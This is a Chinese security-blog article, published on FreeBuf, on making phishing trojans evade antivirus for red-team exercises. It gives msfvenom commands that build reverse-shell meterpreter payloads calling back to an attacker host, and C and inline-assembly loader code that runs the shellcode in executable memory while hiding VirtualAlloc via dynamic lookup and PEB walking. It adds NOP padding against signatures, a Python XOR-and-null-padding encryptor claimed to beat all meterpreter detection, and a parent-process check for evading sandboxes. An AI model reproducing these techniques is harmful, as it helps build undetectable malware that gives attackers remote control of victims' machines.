@@ -1,0 +1,447 @@
+***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**
+
+ **实战演习中，攻击方需要通过各种手段对企业的相关资产进行渗透，挖掘企业资产里存在的漏洞进行得分。近年来这种漏洞挖掘的攻防比赛好像都以 Web
+方面的为主，可能 Web 中存在的漏洞较多，得分点也较多吧。不过，除了 Web 之外， apt 攻击也是一种不错的攻击手法，而且运气好的话直接就进了内网。在
+apt
+攻击中，用的较多的大概就是钓鱼邮件了吧。而钓鱼成功与否一方面和钓鱼文案的诱人程度以及木马的免杀是否到位有着密切的关系。下面介绍下常见的一些免杀技巧。**
+
+## 0x1 shellcode动态加载
+
+Shellcode
+中的代码较为敏感，如果代码中有太多的攻击代码，很容易会被杀软抓到特征进行查杀，而且这种方式做免杀很不好做。所以我们需要将主要的攻击代码单独的编译并静态的存储在数据段中，代码块中只保留一些人畜无害的代码，然后在程序执行的时候申一处可执行的内存，再将这块攻击代码拷贝到申请的内存中执行，这样才能够尽量降低被查杀的概率。那么问题来了，
+shellcode 如何生成呢？你如果牛逼的话，可以自己编写，如果图方便的话，可以使用 msf 生成。一般的生成 payload 命令可以参考如下：
+
+    
+    
+    1 、 msfvenom -p windows/meterpreter/reverse_http-e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=[your remote ip addres] LPORT=[listeningport] -f c >hacker.c
+    
+    2 、 msfvenom -p windows/meterpreter/reverse_tcp-e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=[your remote ip addres]LPORT=[listening port] -f c >hacker.c
+    
+    3 、 msfvenom -p windows/meterpreter/reverse_tcp_rc4-e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=[your remote ip addres]LPORT=[listening port] -f c >hacker.c
+
+这里提供使用 msf 生成 shellcode 的例子，其中使用 revers_tcp_rc4 可以对回话进行加密，对免杀有一定帮助。这里我们生成的是一串
+16 进制的字节数组，我们可以将它加入到我们的 vs 项目中，在程序运行的时候进行动态加载即可执行 shellcode 。
+
+## 0x2 敏感API动态调用
+
+有一些杀软会对 IAT （ Import AddressTable ，即导入地址表，顾名思义， iat
+表中存放着程序中调用的来自外部动态链接库的函数地址）表中的一些敏感函数做检查。比如 fireeye 。经过代码定位排查后发现， Fireeye 会对
+virtualalloc 这个函数进行校验。 Virtualalloc 函数的作用是申请内存，而这里我们之所以用到 virtualalloc
+的一个原因是，我们需要设置内存的可执行属性，这一点很重要，如果我们 shellcode 拷贝到的内存块没有执行权限的话，那么我们的 shellcode
+是无法执行的。
+
+那么我们要如何 bypass fireeye 的检测呢？这里的解决办法是，通过动态调用 API 函数的方式来调用 virtualalloc
+函数。具体的做法是， load kernel32.dll 库，从 kernel32 库中取得 virtualalloc
+函数在内存中的地址，然后执行。这部分的功能可以通过下面的代码实现：
+
+    
+    
+           HMODULE hModule =LoadLibrary(_T("Kernel32.dll"));  
+    
+    
+           HANDLE shellcode_handler;
+    
+           FARPROC Address = GetProcAddress(hModule,"VirtualAlloc");//拿到virtualalloc的地址
+    
+           _asm
+    
+           {
+    
+                  push 40h  //push传参
+    
+                  push 1000h
+    
+                  push 29Ah
+    
+                  push 0
+    
+                  call Address  //函数调用
+    
+                 movshellcode_handler, eax
+    
+           }
+    
+           memcpy(shellcode_handler, newshellcode,sizeof newshellcode);
+    
+           ((void(*)())shellcode_handler)();
+
+这样在 iat 表中就不会出现 virtualalloc 这个函数的地址了。但是，我们解决了 virtualloc
+这个麻烦之后，有一个麻烦出现了。我们在动态调用 virtualalloc 时使用了 loadLibrary 这个函数，蛋疼的是有的杀毒公司会将
+loadLibrary 函数视为敏感的函数，比如俄罗斯的 VBA32 。但是，将 loadLibrary 函数作为查杀的依旧，这未免也太野蛮了，
+不过，如果要解的话，或许可以用下 virtualprotect
+函数，直接修改数据段的可执行属性，然后在程序执行的时候直接跳转到这个内存地址上去执行。那么问题又来了， virtualprotect
+这个函数应该也是不少杀软狠盯的 api
+吧。所以，问题最终还是要解决这个loadLibrary函数。其实获取kernel32.dll库地址并不一定要通过loadLibrary的，也可以从PEB中进行获取的，可以通过以下代码进行获取：  
+
+    
+    
+    _asm {
+    
+    mov esi, fs:[0x30]//得到PEB地址
+    
+    mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
+    
+    mov esi, [esi + 0x1c]//一个双向链表的地址
+    
+    mov esi, [esi]//得到第二个条目kernelBase的链表
+    
+    mov esi, [esi]//得到第三个条目kernel32链表（win10）
+    
+    mov esi, [esi + 0x8] //kernel32.dll地址
+    
+    mov hModule, esi
+    
+    }
+
+果然，这种方法是可以过掉vba32的，但是问题又来了，有些厂商会对这段代码进行检测的，比如fortinet公司的杀毒引擎就会对这段代码进行检测。不过，这是基于机器码的检测，而针对机器码匹配的话基本是进行模式匹配的，所以我们只要在代码中加一些nop指令即可，具体的代码如下：
+
+    
+    
+    _asm {
+    
+    mov esi, fs:[0x30]//得到PEB地址
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    mov esi, [esi + 0x1c]//一个双向链表的地址
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    mov esi, [esi]//得到第二个条目kernelBase的链表
+    
+    NOP
+    
+    NOP
+    
+    NOP
+    
+    mov esi, [esi]//得到第三个条目kernel32链表（win10）
+    
+    NOP
+    
+    NOP
+    
+    mov esi, [esi + 0x8] //kernel32.dll地址
+    
+    NOP
+    
+    NOP
+    
+    mov hModule, esi
+    
+    }
+
+就问这波操作骚不骚，哈哈。
+
+## 0x3 shellcode加密
+
+免杀效果好不好，最主要的是就是 shellcode 的加密了。那么，杀软是如何找到我们的 shellcode 呢？又是如何对我们的 shellcode
+进行查杀的呢？为什么我的 shellcode 加密了还是会被查杀呢？
+
+我们来看下编译后的 shellcode 在 pe 文件中是什么样子的。首先我们知道，字符串数组初始化的内容是存放在 PE 文件的 rdata
+节区中的。下面是 ida 视图：
+
+![](https://image.3001.net/images/20190729/1564367173_5d3e5945e072d.png!small)
+
+其对应的 pe 文件的 hex 信息如下：
+
+![](https://image.3001.net/images/20190729/1564367212_5d3e596c64684.png!small)
+
+从 B8 开始往下 665 字节即我们的 shellcode 。杀毒软件应该就是在这里寻找的字符串特征值。
+
+我们看下这个 shellcode 是在哪里进行引用的：
+
+![](https://image.3001.net/images/20190729/1564367231_5d3e597f5cc8b.png!small)
+
+我们可以看到，这里有一个字符串拷贝的操作。即从 &unk_402108 这个地址处的开始，拷贝 0xa65 个字节到 v15 这个地址处。 0xa65
+即十进制 2661 ，正好是我们的 shellcode 长度 + 一个 ‘\0’ 字符，即 2660+1 。而这里 0x229 即十进制 665
+，是我们的解密之后的 shellcode 的长度。
+
+这里是解密代码：
+
+![](https://image.3001.net/images/20190729/1564367243_5d3e598b5e4f1.png!small)
+
+相应的加密代码是：
+
+    
+    
+    defgenerate_payload(shellcode):  
+    
+    
+           ba=bytearray(shellcode)
+    
+           newshellcode=[]
+    
+           res=''
+    
+           for b in ba:
+    
+                  nchar="\\"
+    
+                  b=b^113^0x77
+    
+                  b=hex(b)
+    
+                  for i in range(1,len(b)):
+    
+                         nchar=nchar+b[i]
+    
+                  res=res+nchar
+    
+                  newshellcode.append(nchar)
+    
+           trash="\\x00"
+    
+           nnshellcode=[]
+    
+           for i in range(4*len(newshellcode)):
+    
+                         if i%4==0: #ou
+    
+                                nnshellcode.append(newshellcode[int(i/4)])
+    
+                         else:
+    
+                                nnshellcode.append(trash)
+    
+           fres=''
+    
+           for i in nnshellcode:
+    
+                  fres=fres+i
+    
+           print(fres)
+
+简要说明下加密代码，这里是先将 shellode 和 113 以及 0x77 进行异或，再在 shellcode 中相邻的两个字节中填充三个 \x00
+（空字节）。实测，这种方式是可以过掉所有的 meterpreter payload 的检测的。我猜哈，杀软应该是收集了一大波的 meterpreter 的
+hex
+特征，作为恶意攻击代码的识别依据。他们可能会对这些特征代码进行进一步异或变形，进而匹配到更多的潜在的攻击代码。所以，网上那些异或一下，十行代码就免杀，肯定是不靠谱的，最多免杀一两天。而在相邻的字节中间插入
+\x00 ，这样有效的避开那些 hex 特征码。想想也对，你总不至于将一堆的空字节作为查杀依据吧。这里为什么要用 \x00
+，而不用其他的呢？我的考虑是，杀软收集的那些特征码可能跟多的是 ef 11 3a ed 这种连续的非空字节，而 ef 00 00 00
+这种一般是不会拿来作为特征码的。那么随机的在两个字节中填充自定义的字节，比如 a1 a2 a3 a4
+呢，这种情况是有一定概率被匹配到的，毕竟杀软的特征库很庞大，就算误报几个也很正常。所以，综合考虑还是填充空字节好点。
+
+然而我还是太天真了，现在的杀软不仅仅是基于这些特征值的匹配的。昨天信心满满的空字节填充免杀之后，今天又被 360
+杀了。那么到底是什么原因免杀的呢？我猜应该是 virustotal
+上的这些引擎对扫描的检测结果彼此之间是有共享的，或者说有些杀软会先比对本地特征库，比对不到的话直接上传到 virustotal ，让 virustotal
+分析一波，如果报毒的话，再对样本特征进行提取。当然某些杀软不会傻到直接 md5 存库里完事了，还是会做一些相似度分析的。依据在哪里呢，我之前的 00
+填充的那个马被杀后，我将原来 payload 进行了异或变异，结果还是被杀了，按理说如果是 md5
+特征比对的话，肯定是杀不了的，所以肯定是做了相似度分析了，我原来的 shellcode 是将原来相邻的两个字节填充上 3
+个空字节。它的相似度分析应该是将我的 shellcode 进行了多次异或，然后取特征值。为了验证我的想法，我将 00 空字节的填充位数改为 9
+个，果然又免杀了。本来我想着，既然能够知道样本是病毒，那么为什么不对其中的结构特征进行识别呢？难道这些 payload 只是做异或加密？ rsa 和 des
+就不说了，一些古典加密算法也有可能哈。我觉得最起码要对这些 shellcode 中的一些常见结构特征进行识别吧，比如 shellcode
+的每一个字节是以等差数列或者其他形式进行存储的，我们就可以对这种结构做一个特征识别，为什么要做结构识别呢？这工作量不是很大吗？有多少种可能的结构。其实我觉得，最起码要识别出在一片连续的区域内存在着一种特殊的情况，那就是一个字节和另一个字节之间相隔了多个相同的字节，这种情况下就很可能就是被垃圾数据填充的
+shellcode 。而且这些数据填充相同的字节，是为了防止被类似 yara 或者 clamav 这种静态 hex
+特征匹配到，这是误报，很冤。所以，我觉得可以将这些填充的特征码去掉，然后将这些去掉垃圾数据的特征码再进一步进行组合。
+
+## 0x4 虚拟机反调试
+
+那么问题来了，如何对抗云沙箱的检测呢？我们知道，很多杀软都有自己的后端云沙箱，这些沙箱能够模拟出软件执行所需的运行环境，通过进程hook技术来对软件执行过程中的行为进行分析，判断其是否有敏感的操作行为，或者更高级的检测手法是，将获取到的程序的API调用序列以及其他的一些行为特征输入到智能分析引擎中（基于机器学习org）进行检测。所以，如果我们的木马没有做好反调试，很容易就被沙箱检测出来。
+
+我这个马目前只有9k大小，完全有可能被上传到云端的沙箱里检测。所以，我们还需要做一些反调试的操作，阻碍云沙箱的行为检测。最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是explore。如果一个程序的父进程不是explor，那么我们就可以认为他是由沙箱启动的。那么我们就直接exit退出，这样，杀软就无法继续对我们进行行为分析了。具体的实现代码如下：
+
+    
+    
+    DWORD get_parent_processid(DWORD pid)
+    
+    {
+    
+           DWORDParentProcessID = -1;
+    
+           PROCESSENTRY32pe;
+    
+           HANDLEhkz;
+    
+           HMODULEhModule = LoadLibrary(_T("Kernel32.dll"));
+    
+           FARPROCAddress = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
+    
+           if(Address == NULL)
+    
+           {
+    
+                  OutputDebugString(_T("GetProc error"));
+    
+                  return-1;
+    
+           }
+    
+           _asm
+    
+           {
+    
+                  push0
+    
+                  push2
+    
+                  callAddress
+    
+                  movhkz, eax
+    
+           }
+    
+           pe.dwSize= sizeof(PROCESSENTRY32);
+    
+           if(Process32First(hkz, &pe))
+    
+           {
+    
+                  do
+    
+                  {
+    
+                         if(pe.th32ProcessID == pid)
+    
+                         {
+    
+                                ParentProcessID= pe.th32ParentProcessID;
+    
+                                break;
+    
+                         }
+    
+                  }while (Process32Next(hkz, &pe));
+    
+           }
+    
+           returnParentProcessID;
+    
+    }
+    
+    DWORD get_explorer_processid()
+    
+    {
+    
+           DWORDexplorer_id = -1;
+    
+           PROCESSENTRY32pe;
+    
+           HANDLEhkz;
+    
+           HMODULEhModule = LoadLibrary(_T("Kernel32.dll"));
+    
+           if(hModule == NULL)
+    
+           {
+    
+                  OutputDebugString(_T("Loaddll error"));
+    
+                  return-1;
+    
+           }
+    
+           FARPROCAddress = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
+    
+           if(Address == NULL)
+    
+           {
+    
+                  OutputDebugString(_T("GetProc error"));
+    
+                  return-1;
+    
+           }
+    
+           _asm
+    
+           {
+    
+                  push0
+    
+                  push2
+    
+                  callAddress
+    
+                  movhkz, eax
+    
+           }
+    
+           pe.dwSize= sizeof(PROCESSENTRY32);
+    
+           if(Process32First(hkz, &pe))
+    
+           {
+    
+                  do
+    
+                  {
+    
+                         if(_stricmp(pe.szExeFile, "explorer.exe") == 0)
+    
+                         {
+    
+                                explorer_id= pe.th32ProcessID;
+    
+                                break;
+    
+                         }
+    
+                  }while (Process32Next(hkz, &pe));
+    
+           }
+    
+           returnexplorer_id;
+    
+    }
+    
+    void domain() {
+    
+           DWORDexplorer_id = get_explorer_processid();
+    
+           DWORDparent_id = get_parent_processid(GetCurrentProcessId());
+    
+           if(explorer_id == parent_id)//判断父进程id是否和explorer进程id相同
+    
+           {
+    
+                  dowork();
+    
+           }
+    
+           else {
+    
+                  exit(1);
+    
+           }
+    
+    }
+
+这里主要的思路是获取调用kernel32库中的CreateToolhelp32Snapshot函数获得一个进程快照信息，然后从快照中获取到explorer.exe的进程id信息，然后通过当前进程的pid信息在进程快照中找到其父进程的id信息，最后将两者进行比较，判断当前进程是否是有人工启动的。当然，反调试的措施不仅仅是检测父进程，还可以通过调用windows的API接口IsDebuggerPresent来检查当前进程是否正在被调试。检测反调试的话，还可以通过检查进程堆的标识符号来实现，系统创建进程时会将Flags置为0x02（HEAP_GROWABLE），将ForceFlags置为0。但是进程被调试时，这两个标志通常被设置为0x50000062h和0x40000060h。当然还可以利用特权指令in
+eax,dx来做免杀。
+
+最后秀一下在virustotal上检测的成绩：
+
+![](https://image.3001.net/images/20190730/1564454996_5d3fb0549430d.png!small)
+
+## 0x5 后记
+
+当然，随着病毒检测技术的不断改进，现在的病毒检测技术已经引入了一些机器学习的技术了，比如使用二类支持向量机对正常软件和恶意软件进行分类，以及使用多类支持向量机对蠕虫，病毒，木马和正常软件进行分类等等。这种利用机器学习来对病毒进行检测的技术前提是需要收集整理足够数量的样本的特征数据，比如针对注册表的行为，开机自启动的行为，隐藏和保护自身的行为，进程行为，文件行为，以及网络行为等等，一般来说，这些行为特征是可以体现在程序的
+API 调用序列中的，所以，很多学术论文中会以程序的 API
+调用序列作为主要的行为特征训练集，通过不断优化算法，相信这种通过海量数据训练而获得的病毒查杀能力的技术应该会是之后杀毒引擎的主要方向。但是魔高一尺，道高一丈，我觉得免杀和查杀之间应该是一种相生相克相互促进的关系，这几天也就算初窥免杀之门吧，相信还有更多高级的免杀手法等待我们去发现。
+
+ ***本文作者：pOny@moresec，本文属 FreeBuf 原创奖励计划，未经许可禁止转载**
+
